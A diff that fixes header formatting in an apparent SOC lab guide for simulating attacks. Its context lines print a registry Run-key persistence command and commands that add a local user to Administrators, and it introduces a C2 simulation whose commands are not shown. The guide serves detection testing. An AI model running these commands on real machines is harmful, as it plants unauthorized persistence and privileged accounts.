@@ -8,7 +8,7 @@ The attack patterns are based on an open-source project: https://github.com/redc
 
 **NOTE** Some settings are triggered in a smaller timeframe just for our lab purpose.
 
-####Attack 1 - Persistence with Registry Key Add.
+#### Attack 1 - Persistence with Registry Key Add.
 
 This attack is run from a command prompt:
 
@@ -16,7 +16,7 @@ This attack is run from a command prompt:
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
 ```
 
-####Attack 2 - User Add and Elevate Privilege
+#### Attack 2 - User Add and Elevate Privilege
 
 Attackers will add new users and elevate the new user to the Administrators group.  This enables the attacker to logon with a different account that is privileged.
 
@@ -26,7 +26,7 @@ net user theusernametoadd ThePassword1!
 net localgroup administrators theusernametoadd /add
 ```
 
-###Attack 3 -DNS / C2 
+### Attack 3 -DNS / C2 
 
 This attack will simulate a command and control (C2) communication.
 
